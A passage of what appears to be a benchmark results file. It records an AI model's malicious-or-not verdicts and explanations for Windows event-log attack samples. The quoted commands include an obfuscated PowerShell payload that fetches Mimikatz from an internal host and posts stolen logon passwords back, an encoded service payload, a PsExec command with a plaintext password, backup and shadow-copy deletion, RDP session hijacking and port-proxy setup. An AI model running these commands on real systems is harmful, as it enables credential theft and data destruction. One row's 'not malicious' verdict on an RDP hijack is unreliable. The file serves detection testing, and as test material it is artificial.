y7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())), \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe""  -baseline ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Resources\113\BaselineWindowsServer2016.xml"" -out ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\BaselineRulesetAll.mof"" -err ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\xmlToMoferrors.txt"" , ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe"" Get ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\BaselineRulesetAll.mof"" ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447"", C:\Windows\system32\secedit.exe /export /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\secedit.exe /export /mergedpolicy /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\MusNotification.exe Display
+- Network: 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show the creation of a malicious service named ""iOWamcEn"" (Event 4697) that executes a heavily obfuscated PowerShell command containing a Base64-encoded Gzip stream, which is a common technique for hiding malicious payloads. This activity is initiated by the user ""admmig"" accessing administrative shares (ADMIN$) from IP 10.23.123.11, indicating lateral movement or remote code execution. The subsequent execution of cmd.exe and powershell.exe with hidden windows and encoded commands confirms an active attack attempting to evade detection."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,NO,100.0,85.6,YES,"4688, 4779, 4778","cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",10.23.23.9,,0.0,10.11,5.1,1.0,4.0,3,13.1,C,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4688, 4779, 4778
+- Processes: cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe
+- Accounts: FS01$, admmig, admmarsid
+- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show a standard RDP session reconnection or initiation where the system account (FS01$) executes `tscon` to connect to an existing RDP session, followed by the launch of typical Windows system processes like `TSTheme.exe`, `AtBroker.exe`, and `rdpclip.exe`. These activities are consistent with normal user login or session recovery behavior and do not exhibit characteristics of malicious command execution or lateral movement."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,95.2,YES,"4688, 4778","sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe","admmig, FS01$, admmarsid","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",10.23.23.9,,0.0,15.10,5.7,6.0,4.0,4,19.7,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4778
+- Processes: sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe
+- Accounts: admmig, FS01$, admmarsid
+- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show a user (admmig) starting a suspicious service named ""hijackservice"" via sc.exe, followed immediately by a system-initiated RDP session hijack using tscon.exe to take over an existing session (Session 2) for another user (admmarsid). This sequence of starting a potentially malicious service and then hijacking an active remote desktop session is a classic technique for lateral movement and persistence, indicating active compromise."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,72.2,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, services.exe, cmd.exe, conhost.exe, whoami.exe, HOSTNAME.EXE, cscript.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$, demo\admmig","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.42.22,,0.0,14.87,4.3,6.0,4.0,4,18.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
+- Processes: PSEXESVC.exe, services.exe, cmd.exe, conhost.exe, whoami.exe, HOSTNAME.EXE, cscript.exe, MonitoringHost.exe
+- Accounts: admmig, SRVDEFENDER01$, demo\admmig
+- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
+- Network: 10.23.42.22
+- Registry: None
+
+EXPLANATION:
+The logs show the installation and execution of the PsExec service (PSEXESVC.exe) via network shares (ADMIN$), followed by the spawning of cmd.exe with hardcoded credentials (-u demo\admmig -p Admin1235) and subsequent execution of reconnaissance commands (whoami, hostname). This pattern is characteristic of lateral movement and remote command execution attacks using PsExec, where an attacker uses valid credentials to execute commands on a remote host. The presence of the `cscript.exe` execution of `MonitorKnowledgeDiscovery.vbs` further indicates potential discovery or persistence activities associated with the compromised session."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-4648 Lateral movement with net use.evtx,easy,A,processed,YES,100.0,90.0,YES,"4688, 4648",C:\Windows\System32\net.exe,"admmig, hack1",net  use m: \\fs03vuln\c$ /USER:offsec\hack1,"fs03vuln.offsec.lan, cifs/fs03vuln.offsec.lan",,0.0,3.60,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4648
+- Processes: C:\Windows\System32\net.exe
+- Accounts: admmig, hack1
+- Commands: net  use m: \\fs03vuln\c$ /USER:offsec\hack1
+- Network: fs03vuln.offsec.lan, cifs/fs03vuln.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The logs show user 'admmig' executing 'net use' to map a network drive to the administrative share 'c$' on 'fs03vuln.offsec.lan' using credentials for 'hack1'. This activity indicates lateral movement or unauthorized access to a remote system's administrative share, which is a common tactic for privilege escalation and data exfiltration."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,YES,100.0,88.9,YES,12,C:\Windows\system32\reg.exe,,,,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,2.89,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 12
+- Processes: C:\Windows\system32\reg.exe
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services
+
+EXPLANATION:
+The event shows the creation of a registry key under Terminal Services policies, which is a common technique to enable or configure Remote Desktop Protocol (RDP) for persistence or lateral movement. The use of `reg.exe` to modify system policy keys related to RDP indicates an attempt to establish remote access capabilities, aligning with MITRE ATT&CK technique T1076. This activity is not routine user behavior and suggests an attacker configuring remote access mechanisms."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,64.3,YES,5600,,,,"http://hacker-proxy.lan:123, http://hacker-bypass.com/",,0.0,4.25,3.9,6.0,4.0,3,16.9,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5600
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: http://hacker-proxy.lan:123, http://hacker-bypass.com/
+- Registry: None
+
+EXPLANATION:
+The logs show a rapid sequence of proxy configuration changes where the proxy settings are cleared and then immediately reconfigured to point to suspicious external hosts (""hacker-proxy.lan"" and ""hacker-bypass.com""). This pattern of modifying system proxy settings to route traffic through attacker-controlled infrastructure is a classic indicator of Man-in-the-Middle (MitM) or data exfiltration attempts. The addition of a proxy bypass for ""<local>"" and ""internal.lan"" further suggests an attempt to maintain internal connectivity while exfiltrating external traffic."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,86.7,YES,"1102, 4688, 4964, 4672, 4624, 4627","netsh.exe, cmd.exe","admmig, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset",10.23.23.9,,0.0,6.91,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4688, 4688, 4964, 4672, 4624, 4627
+- Processes: netsh.exe, cmd.exe
+- Accounts: admmig, FS01$
+- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The sequence shows an attacker clearing security logs (Event ID 1102) to hide activity, followed by configuring `netsh` port proxies to expose internal services (RDP and HTTP) to external networks, which is a common tactic for persistence and lateral movement. The subsequent privileged logon (Event ID 4624/4672) by the same account confirms the attacker maintained high-privilege access to execute these network configuration changes."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",,,0.0,4.33,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4688, 4688
+- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
+- Accounts: admmig, FS03$
+- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The execution of `wmic shadowcopy delete` is a well-known technique used by ransomware and other malware to delete Volume Shadow Copies, preventing data recovery. The subsequent launch of `VSSVC.exe` and `svchost.exe` confirms the system is processing this destructive command, indicating an active attempt to destroy backups."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","wbadmin.exe, WMIADAP.exe, WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",,,0.0,4.43,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4688, 4688
+- Processes: wbadmin.exe, WMIADAP.exe, WmiPrvSE.exe
+- Accounts: admmig, FS03$
+- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The sequence begins with Event ID 1102, indicating the Security log was cleared by user 'admmig', which is a common anti-forensics technique to hide activity. This is immediately followed by the execution of 'wbadmin.exe' with the '-deleteOldest' flag, a command used to delete system backups, which is a strong indicator of ransomware or destructive malware attempting to prevent recovery. The subsequent execution of WMI processes by the system account further supports the presence of automated or scripted malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,processed,YES,100.0,83.3,YES,"800, 4104, 4103",powershell.exe,OFFSEC\admmig,"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete() | }, prompt",,,0.0,3.95,5.0,6.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}, prompt
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the execution of a PowerShell command that deletes Volume Shadow Copies, a common tactic used by ransomware to prevent data recovery. This activity is highly suspicious and indicative of destructive malware behavior or ransomware preparation. The consistent use of the same account and script blocks across multiple event types confirms this was a deliberate action rather than routine maintenance."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4728-Massive account group membership change.evtx,easy,A,processed,YES,100.0,54.2,YES,4728,,"lambda-user, hack-adm-hack",,,,0.0,5.24,3.2,6.0,4.0,3,16.2,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4728
+- Processes: None
+- Accounts: lambda-user, hack-adm-hack
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show a single user, `lambda-user`, adding the account `hack-adm-hack` to 11 different security groups (`Group01` through `Group11`) within a 28-millisecond window. This rapid, automated addition of a suspiciously named account to multiple groups is characteristic of privilege escalation or backdoor account creation, which is not typical of routine administrative tasks."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,70.0,YES,"4624, 4674, 4688","C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" & ( $pSHomE[4]+$pshome[30]+'x')(""$( seT-VariaBLe 'OFs'  '') ""+[sTRING]((91 ,78,101 ,116, 46, 83, 101 ,114, 118, 105,99 , 101,80 , 111,105,110 ,116,77,97,110, 97,103,101,114,93,58, 58 , 83 ,101, 114, 118, 101 ,114, 67,101,114 , 116 , 105,102 , 105 ,99, 97 ,116 , 101,86,97 ,108,105 ,100 , 97, 116, 105 ,111 ,110 , 67, 97 ,108 ,108 , 98,97 ,99 ,107,32 ,61, 32 ,123,36 ,116,114 , 117,101 ,125 , 10,116 , 114 , 121, 123 ,10 , 91 , 82 ,101, 102 ,93,46 ,65 ,115, 115, 101,109, 98 , 108 ,121,46,71, 101 , 116,84 , 121 ,112, 101,40 ,39 ,83 ,121, 115,39, 43, 39 ,116,101,109 , 46 , 77 ,97,110 , 39 , 43 , 39,97, 103 , 101,109 , 101,110 ,116 , 46 , 65, 117, 116 , 39,43,39,111 ,109,97 ,116,105, 111,110,46 ,65, 109,39,43,39 , 115, 105 ,85 ,116 , 39 ,43 , 39 , 105 ,108,115 , 39, 41, 46 ,71 ,101,116 ,70 , 105 ,101, 108 ,100,40,39 ,97 , 39 ,43, 39 ,115,105,73,110 ,105, 39, 43, 39, 116 ,70 ,97 ,105 ,101 ,108 ,101, 100,39,44, 32 ,39 , 78 ,111, 110 , 80 , 39,43,39 , 117 ,98, 108 ,105,99 , 44 , 83, 116 , 97 ,39,43,39 ,116 , 105 , 99 ,39,41,46 ,83,101 ,116,86,97, 108 ,117 ,101 , 40 ,36, 110 , 117,108,108,44 ,32 ,36 ,116 ,114,117,101,41, 10 ,125 , 99 ,97, 116, 99,104 ,123,125 , 10 ,91, 78 ,101, 116, 46, 83 , 101,114,118,105 , 99, 101 ,80 ,111 ,105 ,110 ,116 , 77 , 97,110, 97, 103, 101 ,114, 93, 58, 58, 83 ,101,114 , 118 , 101, 114 ,67,101,114,116,105 , 102, 105,99 , 97 ,116,101 , 86 , 97 ,108,105, 100,97,116 ,105 ,111 ,110,67 ,97 ,108, 108,98, 97,99 ,107, 32,61, 32, 123,36,116,114 ,117 , 101 ,125,10, 91 , 83 ,121 , 115, 116, 101 , 109 ,46 ,78, 101 ,116,46,83, 101 ,114, 118 ,105, 99, 101 , 80,111 , 105 ,110 ,116, 77, 97,110 ,97 ,103, 101,114 ,93, 58,58, 83 ,101,99 , 117 ,114 , 105, 116 , 121 , 80,114 , 111 ,116 ,111 ,99 , 111,108 , 32 , 61 , 32,91 ,83 , 121 , 115, 116, 101,109,46,78, 101,116 ,46 ,83 ,101 , 99 , 117,114,105, 116 ,121,80 , 114 ,111 , 116, 111,99, 111,108,84, 121,112, 101 , 93,39 , 83 , 115 , 108 ,51 , 44 ,84 ,108,115, 44 ,84, 108,115, 49,49 , 44, 84,108 , 115 ,49, 50, 39,10, 73,69 ,88, 32 , 40, 78,101 , 119 , 45 ,79, 98, 106 , 101 , 99 , 116, 32 ,78,101 ,116 , 46,87 , 101,98 , 67, 108 , 105 ,101,110,116,41,46,68 , 111,119,110 ,108 ,111 ,97,100 ,83 , 116 , 114, 105 , 110, 103,40 ,39,104 ,116,116, 112 ,115, 58,47 , 47 ,49, 48,46 ,50,51 ,46 , 49, 50 ,51, 46,49 ,49 ,58 , 50 ,54 ,50, 54 , 47 , 73 ,110, 118 , 111, 107 ,101,45,77 , 105 ,109, 105 ,107, 97 ,116 ,122, 46 ,112,115, 49 ,39, 41,10, 36 ,99 ,109 ,100 ,32,61,32, 73, 110 , 118,111, 107, 101 ,45 , 77, 105,109 ,105, 107 ,97,116,122 ,32 ,45, 67,111, 109 ,109 ,97 ,110,100, 32,39 ,112,114 ,105, 118, 105,108 , 101,103,101,58 ,58,100 ,101 , 98,117,103 ,32,115,101,107,117 ,114,108 ,115 ,97 ,58 , 58 , 108, 111,103, 111,110, 112 ,97,115 , 115 ,119,111,114,100 , 115 , 101,120 ,105 , 116,39,10 , 36, 114,101 ,113 ,117 , 101, 115 , 116,32,61, 32 , 91 ,83 , 121 , 115,116 ,101, 109 , 46,78, 101,116, 46 ,87,101,98,82,101 , 113 ,117,101 , 115 ,116 ,93, 58 , 58 , 67,114 ,101, 97 , 116, 101 , 40 ,39 ,104,116 ,116 , 112 ,115, 58 , 47 , 47, 49,48 ,46, 50 , 51 , 46 ,49, 50 , 51, 46,49 ,49, 58 , 50,54 , 50,54 , 47 ,39, 41,10 ,36 ,114, 101, 113,117,101 ,115,116 , 46,77, 101,116,104 , 111 , 100 , 32 , 61, 32,39 , 80, 79 , 83,84,39 ,10 , 36 ,114 , 101, 113 , 117 , 101 ,115,116 , 46 ,67,111, 110 , 116, 101,110,116 ,84,121, 112, 101,32 , 61 , 32 ,39 ,97 ,112 ,112 ,108 , 105 , 99,97 , 116, 105 ,111 ,110, 47,120,45 , 119,119 , 119 ,45,102,111, 114 ,109 ,45,117, 114, 108 ,101 ,110 ,99 , 111,100 , 101 ,100 , 39,10,36,98,121, 116, 101, 115 , 32 , 61 ,32 , 91 , 83, 121 , 115, 116,101 , 109 , 46,84 ,101,120 ,116 , 46,69 , 110, 99 , 111 , 100 ,105 ,110 ,103,93 , 58 ,58, 65 , 83, 67, 73 , 73 , 46 ,71, 101 ,116 ,66 , 121 ,116,101 , 115 , 40 ,36 ,99 , 109 , 100, 41, 10, 36 , 114, 101, 113 , 117 ,101 ,115, 116, 46, 67 , 111, 110 ,116, 101,110 , 116 , 76,101,110,103,116 , 104 , 32,61 ,32, 36 ,98 ,121,116, 101 ,115 ,46,76, 101,110,103 ,116, 104,10, 36,114 , 101, 113 , 117 ,101, 115, 116,83,116 ,114 ,101,97, 109 , 32,61 , 32 ,36, 114,101 ,113 , 117 ,101 ,115 , 116,46 , 71, 101,116,82,101,113 ,117,101, 115 ,116 ,83, 116,114, 101,97, 109 , 40,41, 10, 36,114 , 101, 113, 117,101 ,115 , 116 , 83,116 ,114 , 101 , 97 ,109 , 46,87,114 ,105 ,116,101,40,36 , 98 , 121 ,116 , 101 ,115 ,44,32 ,48 ,44, 32, 36 ,98,121,116, 101 ,115 , 46,76 ,101,110 ,103,116, 104, 41 , 10 , 36,114,101,113 , 117,101 , 115, 116,83,116,114 , 101, 97 ,109 , 46,67, 108,111 ,115,101 , 40 ,41 , 10 , 36, 114 ,101, 113, 117,101 ,115 , 116 , 46,71 ,101, 116,82 ,101 , 115, 112 ,111 ,110,115,101, 40 ,41) | % { ( [ChaR][InT]$_) } ) +""$(sEt-iTeM  'vArIaBLE:ofS'  ' ' ) "" ) "", C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""",10.23.123.11,"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",0.0,107.18,4.2,5.0,4.0,2,15.2,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 4674, 4688
+- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
+- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" & ( $pSHomE[4]+$pshome[30]+'x')(""$( seT-VariaBLe 'OFs'  '') ""+[sTRING]((91 ,78,101 ,116, 46, 83, 101 ,114, 118, 105,99 , 101,80 , 111,105,110 ,116,77,97,110, 97,103,101,114,93,58, 58 , 83 ,101, 114, 118, 101 ,114, 67,101,114 , 116 , 105,102 , 105 ,99, 97 ,116 , 101,86,97 ,108,105 ,100 , 97, 116, 105 ,111 ,110 , 67, 97 ,108 ,108 , 98,97 ,99 ,107,32 ,61, 32 ,123,36 ,116,114 , 117,101 ,125 , 10,116 , 114 , 121, 123 ,10 , 91 , 82 ,101, 102 ,93,46 ,65 ,115, 115, 101,109, 98 , 108 ,121,46,71, 101 , 116,84 , 121 ,112, 101,40 ,39 ,83 ,121, 115,39, 43, 39 ,116,101,109 , 46 , 77 ,97,110 , 39 , 43 , 39,97, 103 , 101,109 , 101,110 ,116 , 46 , 65, 117, 116 , 39,43,39,111 ,109,97 ,116,105, 111,110,46 ,65, 109,39,43,39 , 115, 105 ,85 ,116 , 39 ,43 , 39 , 105 ,108,115 , 39, 41, 46 ,71 ,101,116 ,70 , 105 ,101, 108 ,100,40,39 ,97 , 39 ,43, 39 ,115,105,73,110 ,105, 39, 43, 39, 116 ,70 ,97 ,105 ,101 ,108 ,101, 100,39,44, 32 ,39 , 78 ,111, 110 , 80 , 39,43,39 , 117 ,98, 108 ,105,99 , 44 , 83, 116 , 97 ,39,43,39 ,116 , 105 , 99 ,39,41,46 ,83,101 ,116,86,97, 108 ,117 ,101 , 40 ,36, 110 , 117,108,108,44 ,32 ,36 ,116 ,114,117,101,41, 10 ,125 , 99 ,97, 116, 99,104 ,123,125 , 10 ,91, 78 ,101, 116, 46, 83 , 101,114,118,105 , 99, 101 ,80 ,111 ,105 ,110 ,116 , 77 , 97,110, 97, 103, 101 ,114, 93, 58, 58, 83 ,101,114 , 118 , 101, 114 ,67,101,114,116,105 , 102, 105,99 , 97 ,116,101 , 86 , 97 ,108,105, 100,97,116 ,105 ,111 ,110,67 ,97 ,108, 108,98, 97,99 ,107, 32,61, 32, 123,36,116,114 ,117 , 101 ,125,10, 91 , 83 ,121 , 115, 116, 101 , 109 ,46 ,78, 101 ,116,46,83, 101 ,114, 118 ,105, 99, 101 , 80,111 , 105 ,110 ,116, 77, 97,110 ,97 ,103, 101,114 ,93, 58,58, 83 ,101,99 , 117 ,114 , 105, 116 , 121 , 80,114 , 111 ,116 ,111 ,99 , 111,108 , 32 , 61 , 32,91 ,83 , 121 , 115, 116, 101,109,46,78, 101,116 ,46 ,83 ,101 , 99 , 117,114,105, 116 ,121,80 , 114 ,111 , 116, 111,99, 111,108,84, 121,112, 101 , 93,39 , 83 , 115 , 108 ,51 , 44 ,84 ,108,115, 44 ,84, 108,115, 49,49 , 44, 84,108 , 115 ,49, 50, 39,10, 73,69 ,88, 32 , 40, 78,101 , 119 , 45 ,79, 98, 106 , 101 , 99 , 116, 32 ,78,101 ,116 , 46,87 , 101,98 , 67, 108 , 105 ,101,110,116,41,46,68 , 111,119,110 ,108 ,111 ,97,100 ,83 , 116 , 114, 105 , 110, 103,40 ,39,104 ,116,116, 112 ,115, 58,47 , 47 ,49, 48,46 ,50,51 ,46 , 49, 50 ,51, 46,49 ,49 ,58 , 50 ,54 ,50, 54 , 47 , 73 ,110, 118 , 111, 107 ,101,45,77 , 105 ,109, 105 ,107, 97 ,116 ,122, 46 ,112,115, 49 ,39, 41,10, 36 ,99 ,109 ,100 ,32,61,32, 73, 110 , 118,111, 107, 101 ,45 , 77, 105,109 ,105, 107 ,97,116,122 ,32 ,45, 67,111, 109 ,109 ,97 ,110,100, 32,39 ,112,114 ,105, 118, 105,108 , 101,103,101,58 ,58,100 ,101 , 98,117,103 